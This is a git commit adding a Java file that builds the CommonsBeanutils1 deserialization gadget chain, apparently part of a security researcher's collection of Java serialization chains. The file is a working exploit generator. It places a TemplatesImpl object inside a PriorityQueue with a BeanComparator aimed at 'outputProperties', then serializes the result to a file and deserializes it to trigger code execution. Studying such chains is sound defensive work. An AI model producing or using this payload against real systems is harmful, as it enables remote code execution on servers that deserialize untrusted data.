5068a2d976c495ffdee37d26a33b51f5553e3e84
Firebasky <63966847+Firebasky@users.noreply.github.com>
2021-09-14 17:08:44 +0800

    Create CommonsBeanutils1.java

---
+++ java序列化链/CommonsBeanutils/CommonsBeanutils1.java
@@ -0,0 +1,21 @@
+package CommonsBeanutils;
+
+import java.util.PriorityQueue;
+import Tools.SerializeUtil;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import org.apache.commons.beanutils.BeanComparator;
+
+public class CommonsBeanutils1 {
+    public static String fileName = "CommonsBeanutils1.bin";
+    public static void main(String[] args) throws Exception {
+        TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();
+        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
+        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
+        queue.add("1");
+        queue.add("1");
+        SerializeUtil.setFieldValue(comparator, "property", "outputProperties");
+        SerializeUtil.setFieldValue(queue, "queue", new Object[]{tmpl, tmpl});
+        SerializeUtil.writeObjectToFile(queue, fileName);
+        SerializeUtil.readFileObject(fileName);
+    }
+}
